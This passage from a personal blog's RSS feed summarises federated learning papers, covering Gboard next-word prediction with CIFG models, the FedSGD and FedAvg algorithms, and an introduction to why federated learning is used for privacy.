&lt;p&gt;Server-based training of the CIFG next-word prediction model relies on data logged from Gboard users who have opted to share snippets of text while typing in &lt;em&gt;Google apps&lt;/em&gt;. The text is truncated to contain short phrases of a few words, and snippets are only sporadically logged from individual users. Prior to training, logs are anonymized and stripped of personally identifiable information. Additionally, snippets are only used for training if they begin with a start of sentence token.&lt;/p&gt;
&lt;p&gt;Asynchronous stochastic gradient descent with a learning rate equal to 10&lt;sup&gt;-3&lt;/sup&gt; and no weight decay or momentum is used to train the server CIFG. Adaptive gradient methods like Adam and AdaGrad do not improve convergence. The network converges after 150 million steps of SGD.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-12-27_federated_learning_mobile_keyboard/images/server-sgd.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-12-27_federated_learning_mobile_keyboard/images/server-sgd.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;h4 id=&#34;federated-training-with-client-caches&#34;&gt;Federated training with client caches&lt;/h4&gt;
&lt;p&gt;As with the logs data, each client cache stores text belonging to the device owner, as well as prediction candidates generated by the decoder. Devices must have at least 2 gigabytes of memory available. Additionally, the clients are
only allowed to participate if they are charging, connected to an un-metered network, and idle.&lt;/p&gt;
&lt;p&gt;The FedAvg algorithm is used here. Between 100 and 500 client updates are required to close each round of federated training in Gboard. The server update is achieved via the Momentum optimizer, using Nesterov accelerated gradient, a momentum hyperparameter of 0.9, and a server learning rate of 1.0 .&lt;/p&gt;
&lt;p&gt;On average, each client processes approximately 400 example sentences during a single training epoch. The federated CIFG converges after 3000 training rounds, over the course of which 600 million sentences are processed by 1.5 million clients.&lt;/p&gt;
&lt;p&gt;N-gram model recall is measured by comparing the decoder candidates stored in the on-device training cache to the actual user-entered text.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-12-27_federated_learning_mobile_keyboard/images/cache-sgd.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-12-27_federated_learning_mobile_keyboard/images/cache-sgd.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;h2 id=&#34;results&#34;&gt;Results&lt;/h2&gt;
&lt;p&gt;Recall (metric) for the highest likelihood candidate is important for Gboard because users are more prone to read and utilize predictions in the centre suggestion spot. Both top-1 and top-3 recall are of interest here.&lt;/p&gt;
&lt;p&gt;Server-hosted logs data and client device-owned caches are used to measure prediction recall. Although each contain snippets of data from actual users, the client caches are believed to more accurately represent the true typing data distribution. Cache data, unlike logs, are not truncated in length and are not restricted to keyboard usage in Google-owned apps.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-12-27_federated_learning_mobile_keyboard/images/tab3.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-12-27_federated_learning_mobile_keyboard/images/tab3.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;














&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-12-27_federated_learning_mobile_keyboard/images/tab4.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-12-27_federated_learning_mobile_keyboard/images/tab4.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Prediction impression recall is measured by dividing the number of predictions that match the user-entered text by the number of times users are shown prediction candidates. The prediction impression recall metric is typically lower than the standard recall metric. Zero-state prediction events (in which users open the Gboard app but do not commit any text) increase the number of impressions but not matches.&lt;/p&gt;
&lt;p&gt;The prediction click-through rate (CTR), defined as the ratio of the number of clicks on prediction candidates to the number of proposed prediction candidates.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-12-27_federated_learning_mobile_keyboard/images/tab5.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-12-27_federated_learning_mobile_keyboard/images/tab5.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;














&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-12-27_federated_learning_mobile_keyboard/images/tab6.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-12-27_federated_learning_mobile_keyboard/images/tab6.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;For both the server training and the federated training, the CIFG model improves the top-1 and top-3 recall with respect to the baseline n-gram FST model.&lt;/p&gt;
&lt;p&gt;These gains are impressive given that the n-gram model uses an order of magnitude larger vocabulary and includes personalized components such as user history and contacts language models.&lt;/p&gt;
&lt;p&gt;The results also demonstrate that the federated CIFG performs better on recall metrics than the server-trained CIFG. Comparisons on server-hosted logs data show the recall of the two models is comparable, though the logs are not as representative of the true typing distribution.&lt;/p&gt;
&lt;p&gt;Different flavors of SGD are used in each training context—the results show that federated learning provides a preferable alternative to server-based training of neural language models.&lt;/p&gt;
&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;CIFG language model trained from scratch using federated learning can outperform an identical server trained CIFG model and baseline n-gram model on the keyboard next-word prediction task.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;I have also released an annotated version of the paper. If you are interested, you can find it &lt;a href=&#34;https://github.com/shreyansh26/Annotated-ML-Papers/blob/main/PPML/Federated%20Learning/Federated%20Learning%20for%20Mobile%20Keyboard%20Prediction.pdf&#34;&gt;here&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;That&amp;rsquo;s all for now!&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script data-name=&#34;BMC-Widget&#34; data-cfasync=&#34;false&#34; src=&#34;https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js&#34; data-id=&#34;shreyanshsingh&#34; data-description=&#34;Support me on Buy me a coffee!&#34; data-message=&#34;&#34; data-color=&#34;#FF5F5F&#34; data-position=&#34;Right&#34; data-x_margin=&#34;18&#34; data-y_margin=&#34;18&#34;&gt;&lt;/script&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>PPML Series #2 - Federated Optimization Algorithms - FedSGD and FedAvg</title>
      <link>https://shreyansh26.github.io/post/2021-12-18_federated_optimization_fedavg/</link>
      <pubDate>Sat, 18 Dec 2021 00:16:23 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2021-12-18_federated_optimization_fedavg/</guid>
      <description>&lt;p&gt;In my last post, I covered a high-level overview of Federated Learning, its applications, advantages &amp;amp; challenges.&lt;/p&gt;
&lt;p&gt;We also went through a high-level overview of how Federated Optimization algorithms work. But from a mathematical sense, how is Federated Learning training actually performed? That&amp;rsquo;s what we will be looking at in this post.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;There was a &lt;a href=&#34;https://arxiv.org/abs/1602.05629&#34;&gt;paper&lt;/a&gt;, Communication-Efficient Learning of Deep Networks from Decentralized Data by Google (3637 citations!!!), in which the authors had proposed a federated optimization algorithm called FedAvg and compared it with a naive baseline, FedSGD.&lt;/p&gt;
&lt;h2 id=&#34;fedsgd&#34;&gt;FedSGD&lt;/h2&gt;
&lt;p&gt;Stochastic Gradient Descent (SGD) had shown great results in deep learning. So, as a baseline, the researchers decided to base the Federated Learning training algorithm on SGD as well. SGD can be applied naively to the federated optimization problem, where a single batch gradient calculation (say on a randomly selected client) is done per round of communication.&lt;/p&gt;
&lt;p&gt;The paper showed that this approach is computationally efficient, but requires very large numbers of rounds of training to produce good models.&lt;/p&gt;
&lt;p&gt;Before we get into the maths, I&amp;rsquo;ll define a few terms -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-12-18_federated_optimization_fedavg/images/Latex-FL.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-12-18_federated_optimization_fedavg/images/Latex-FL.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The baseline algorithm, was called FedSGD, short for Federated SGD.&lt;/p&gt;
&lt;p&gt;For FedSGD, the parameter &lt;em&gt;C&lt;/em&gt; (explained above) which controls the global batch size is set to 1. This corresponds to a full-batch (non-stochastic) gradient descent. For the current global model &lt;i&gt;w&lt;sup&gt;t&lt;/sup&gt;&lt;/i&gt;, the average gradient on its global model is calculated for each client &lt;em&gt;k&lt;/em&gt;.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-12-18_federated_optimization_fedavg/images/FedSGD-updates.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-12-18_federated_optimization_fedavg/images/FedSGD-updates.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The central server then aggregates these gradients and applies the update.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-12-18_federated_optimization_fedavg/images/FedSGD-updates2.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-12-18_federated_optimization_fedavg/images/FedSGD-updates2.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;h2 id=&#34;fedavg&#34;&gt;FedAvg&lt;/h2&gt;
&lt;p&gt;We saw FedSGD. Now let&amp;rsquo;s make a small change to the update step above.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-12-18_federated_optimization_fedavg/images/FedAvg-updates.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-12-18_federated_optimization_fedavg/images/FedAvg-updates.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;What this does is that now each client locally takes one step of gradient descent
on the current model using its local data, and the server then takes a weighted average of the resulting models.&lt;/p&gt;
&lt;p&gt;This way we can add more computation to each client by iterating the local update multiple times before doing the averaging step. This small modification results in the FederatedAveraging (FedAvg) algorithm.&lt;/p&gt;
&lt;p&gt;But why make this change? The answer is in my last post -&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In practice, major speedups are obtained when computation on each client is improved, once a minimum level of parallelism over clients is achieved.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The amount of computation is controlled by three parameters -&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C&lt;/strong&gt; - Fraction of clients participating in that round
&lt;strong&gt;E&lt;/strong&gt; - No. of training passes each client makes over its local dataset each round
&lt;strong&gt;B&lt;/strong&gt; - Local minibatch size used for client updates&lt;/p&gt;
&lt;p&gt;The pseudocode for the FedAvg algorithm is shown below.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-12-18_federated_optimization_fedavg/images/FedAvg-algo.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-12-18_federated_optimization_fedavg/images/FedAvg-algo.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;B = ꝏ (used in experiments) implies full local dataset is treated as the minibatch. So, setting B = ꝏ and E = 1 makes this the FedSGD algorithm.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2 id=&#34;results&#34;&gt;Results&lt;/h2&gt;
&lt;p&gt;Okay, now let&amp;rsquo;s look at some experimental results, although I would also suggest looking up the results from the original paper as well.
One experiment showed the number of rounds required to attain a target accuracy, in two tasks - MNIST and a character modelling task.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-12-18_federated_optimization_fedavg/images/res1.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-12-18_federated_optimization_fedavg/images/res1.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Here, IID and non-IID here refer to the datasets that were artificially generated by the authors to represent two kinds of distributions - IID, in which there is in fact an IID distribution among the clients. And non-IID in which the data is not IID among the clients. For example, for the MNIST dataset the authors studied two ways of partitioning the MNIST data over clients: IID, where the data is shuffled, and then partitioned into 100 clients each receiving 600 examples, and Non-IID, where we first sort the data by digit label, divide it into 200 shards of size 300, and assign each of 100 clients 2 shards. For the language modeling task, the dataset was built from &lt;em&gt;The Complete Works of William Shakespeare&lt;/em&gt;. From the paper -&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;We construct a client dataset for each speaking role in each play with at least two lines. This produced a dataset with 1146 clients. For each client, we split the data into a set of training lines (the first 80% of lines for the role), and test lines (the last 20%, rounded up to at least one line). The resulting dataset has 3,564,579 characters in the training set, and 870,014 characters in the test set. This data is substantially unbalanced, with many roles having only a few lines, and a few with a large number of lines. Further, observe the test set is not a random sample of lines, but is temporally separated by the chronology of each play. Using an identical train/test split, we also form a balanced and IID version of the dataset, also with 1146 clients.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;For the MNIST dataset, a CNN with two 5x5 convolution layers (the first with 32 channels, the second with 64, each followed with 2x2 max pooling), a fully connected layer with 512 units and ReLu activation, and a final softmax output layer was used. And for the language modeling task, a stacked character-level LSTM language model, which after reading each character in a line, predicts the next character. The model takes a series of characters as input and embeds each of these into a learned 8 dimensional space. The embedded characters are then processed through 2 LSTM layers, each with 256 nodes. Finally the output of the second LSTM layer is sent to a softmax output layer with one node per character. The full model has 866,578 parameters, and we trained using an unroll length of 80 characters.&lt;/p&gt;
&lt;p&gt;From the results in the paper, it could be seen that in both the IID and non-IID settings, keeping a small mini-batch size and higher number of training passes on each client per round resulted in the model converging faster. For all model classes, FedAvg converges to a higher level of test accuracy than the baseline FedSGD models. For the CNN, the B = ꝏ; E = 1 FedSGD model reaches 99.22% accuracy in 1200 rounds, while the B = 10 ;E = 20 FedAvg model reaches an accuracy of 99.44% in 300 rounds.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-12-18_federated_optimization_fedavg/images/res2.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-12-18_federated_optimization_fedavg/images/res2.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The authors also hypothesise that in addition to lowering communication costs, model averaging produces a regularization benefit similar to that achieved by dropout.&lt;/p&gt;
&lt;p&gt;All in all, the experiments demonstrated that the FedAvg algorithm was robust to unbalanced and non-IID distributions, and also reduced the number of rounds of communication required for training, by orders of magnitude.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;I wrote a Twitter thread on this topic as well - do give it a like/follow me if you liked the article.&lt;/p&gt;
&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;My last thread covered a high-level overview of Federated Learning, its applications, advantages &amp;amp; challenges.&lt;br&gt;&lt;br&gt;But from a mathematical sense, how is Federated Learning training actually performed? That&amp;#39;s what we will be looking at in this thread 🧵&lt;a href=&#34;https://t.co/anyvEluWoq&#34;&gt;https://t.co/anyvEluWoq&lt;/a&gt;&lt;/p&gt;&amp;mdash; Shreyansh Singh (@shreyansh_26) &lt;a href=&#34;https://twitter.com/shreyansh_26/status/1463454860460785670?ref_src=twsrc%5Etfw&#34;&gt;November 24, 2021&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&#34;https://platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;

&lt;p&gt;That&amp;rsquo;s the end for now!&lt;/p&gt;
&lt;p&gt;This post finishes my summary on the basics of Federated Learning and is also a concise version of the very famous paper &amp;ldquo;Communication-Efficient Learning of Deep Networks from Decentralized Data&amp;rdquo; by Google.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;I have also released an annotated version of the paper. If you are interested, you can find it &lt;a href=&#34;https://github.com/shreyansh26/Annotated-ML-Papers/blob/main/PPML/Federated%20Learning/Communication-Efficient%20Learning%20of%20Deep%20Networks%20from%20Decentralized%20Data.pdf&#34;&gt;here&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;If the post helps you or you have any questions, do let me know!&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script data-name=&#34;BMC-Widget&#34; data-cfasync=&#34;false&#34; src=&#34;https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js&#34; data-id=&#34;shreyanshsingh&#34; data-description=&#34;Support me on Buy me a coffee!&#34; data-message=&#34;&#34; data-color=&#34;#FF5F5F&#34; data-position=&#34;Right&#34; data-x_margin=&#34;18&#34; data-y_margin=&#34;18&#34;&gt;&lt;/script&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>PPML Series #1 - An introduction to Federated Learning</title>
      <link>https://shreyansh26.github.io/post/2021-12-11_intro_to_federated_learning/</link>
      <pubDate>Sat, 11 Dec 2021 16:17:16 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2021-12-11_intro_to_federated_learning/</guid>
      <description>&lt;hr&gt;
&lt;h2 id=&#34;motivation&#34;&gt;Motivation&lt;/h2&gt;
&lt;p&gt;Privacy-preserving Machine Learning had always been exciting for me. Since my B.Tech. thesis involving PPML (SMPC + Computer Vision), I didn&amp;rsquo;t get a chance to work on it after that. So, after about 2 years, I have started to read about it again, and sharing it with the community.&lt;/p&gt;
&lt;p&gt;Federated Learning is a domain that I had somewhat eluded during my thesis. I had some idea about the topic but didn&amp;rsquo;t get into it much. So, I decided to start with FL this time. There is a ton of literature out there and is a field of active interest right now.&lt;/p&gt;
&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Modern mobile devices have abundance of data, majorly textual data, image data. Applying machine learning to these can definitely help improve user experience. For example - your mobile keyboard uses language models can improve speech recognition and text entry, your photos apps (Google Photos, say) has image models that can automatically select good photos.&lt;/p&gt;
&lt;p&gt;However, we have two problems here. Firstly, if we consider millions of devices, then this data is large in quantity. Secondly, this dataset may have personal pictures, textual information written by the device owners,among other things.  Hence, this data is privacy sensitive in most cases. This creates problems to store this data in a database. It can be both infeasible as well as cause privacy violations.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Federated Learning&lt;/em&gt; is a decentralised machine learning approach which allows to leave the training data on the individual devices and learns a shared model by aggregating locally computed gradient updates. Federated Learning can significantly reduce privacy and security risks by limiting the attack surface to only the device, rather than the device and the cloud. Obviously, some level of trust on the server coordinating the training is still required.&lt;/p&gt;
&lt;h2 id=&#34;why-fl&#34;&gt;Why FL?&lt;/h2&gt;
&lt;p&gt;Federated Learning usually helps in three contexts -&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Training on real-world data from mobile devices provides advantage over training on proxy data stored in data centres. The distributions from which these examples are drawn are likely to differ substantially from easily available proxy datasets: the use of language in chat and text messages is generally much different than standard language corpora, e.g., chat messages are not like Wikipedia articles. Images taken through the camera are also not like Flickr images.&lt;/li&gt;
&lt;li&gt;The  data is privacy sensitive or large in size (compared to the size of the model), so it is preferable not to log it to the data centre purely for the purpose of model training.&lt;/li&gt;
&lt;li&gt;Sometimes, labels for tasks can naturally be obtained from user interaction. Entered text is self-labeled for learning a language model, and photo labels can be defined by natural user interaction with their photo app (which photos are deleted, shared, or viewed).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Applications of FL could include image classification, predicting which images will be viewed multiple times in the future, language modelling, next word/phrase prediction.&lt;/p&gt;
&lt;h3 id=&#34;how-does-fl-provide-privacy-up-to-a-certain-extent&#34;&gt;How does FL provide privacy (up to a certain extent)?&lt;/h3&gt;
&lt;p&gt;Handling even anonymized data can lead to privacy concerns. What better way than to use the data itself to train the models but at the same time, not risk its privacy. In contrast, the information transmitted for federated learning is the minimal update necessary to improve a particular model. They will generally contain much less information about the raw data. Further, the source of the updates is not needed by the aggregation algorithm, so updates can be transmitted without identifying meta-data over a mix network such as Tor or trusted third-parties.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script data-name=&#34;BMC-Widget&#34; data-cfasync=&#34;false&#34; src=&#34;https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js&#34; data-id=&#34;shreyanshsingh&#34; data-description=&#34;Support me on Buy me a coffee!&#34; data-message=&#34;&#34; data-color=&#34;#FF5F5F&#34; data-position=&#34;Right&#34; data-x_margin=&#34;18&#34; data-y_margin=&#34;18&#34;&gt;&lt;/script&gt;
&lt;h2 id=&#34;federated-optimization&#34;&gt;Federated Optimization&lt;/h2&gt;
&lt;p&gt;The optimization problem implicit in federated learning as federated optimization, drawing a connection (and contrast) to distributed optimization.&lt;/p&gt;
&lt;h3 id=&#34;how-is-fl-different-from-any-other-distributed-optimization-problem&#34;&gt;How is FL different from any other distributed optimization problem?&lt;/h3&gt;
&lt;p&gt;In federated optimization, there are a few key properties that differentiate from a typical distributed optimization problem.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Non-IID&lt;/strong&gt; - Training data will vary from user to user and will not have properties that are similar to the population.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Unbalanced&lt;/strong&gt; - Some users use a device more and generate more data, some less.&lt;/li&gt;
